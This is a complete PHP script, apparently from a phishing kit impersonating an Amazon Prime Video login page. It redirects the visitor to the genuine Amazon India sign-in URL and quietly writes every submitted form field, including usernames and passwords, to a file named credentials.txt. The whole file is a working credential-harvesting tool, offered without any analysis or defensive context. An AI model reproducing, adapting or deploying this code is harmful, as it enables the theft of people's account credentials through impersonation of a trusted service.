<?php

header('Location: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Feu.primevideo.com%2Fauth%2Freturn%2Fref%3Dav_auth_ap%3F_t%3Dsg4AEVQdDthbbvTdSD73_nC7qzerakPVhfvinpzBBWZkmAAAAAQAAAABkuBzrcmF3AAAAAPgWC9WfHH8iB-olH_E9xQ%26location%3D%2Foffers%2Fnonprimehomepage-dc%3Fgclid%253DEAIaIQobChMI3Oy0t6WbgAMV-9UWBR2s9AqZEAAYASAAEgIygvD_BwE%2526ref_%253Ddvm_pds_amz_in_as_s_gm_159_mkw_sRumWk2Nj%2526mrntrk%253Dpcrid_657901934579_slid__pgrid_84577172328_pgeo_1007820_x__adext__ptid_kwd-303629226711&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&accountStatusPolicy=P1&openid.assoc_handle=amzn_prime_video_sso_in&openid.mode=checkid_setup&siteState=260-8150245-2221218&language=en_US&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0');

$handle=fopen("credentials.txt","a");
foreach ($_POST as $variable=>$value) 
{
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
